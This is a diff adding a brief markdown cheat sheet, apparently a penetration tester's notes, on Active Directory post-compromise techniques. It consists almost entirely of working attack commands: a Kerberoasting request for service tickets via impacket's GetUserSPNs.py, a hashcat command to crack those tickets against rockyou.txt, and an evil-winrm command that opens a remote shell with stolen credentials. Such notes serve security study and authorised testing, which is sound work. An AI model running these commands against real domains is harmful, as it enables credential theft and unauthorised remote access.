@@ -1,0 +1,13 @@
+# Active Directory: Post Compromise
+
+## kerberoasting
+
+`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py domain/user:password -dc-ip ip_of_domain_controller -request`
+
+Save the ticket to a file.
+
+`hashcat -m 13100 ticket_file rockyou.txt -O`
+
+## evil-winrm
+
+`evil-winrm -i domain -u user -p password`
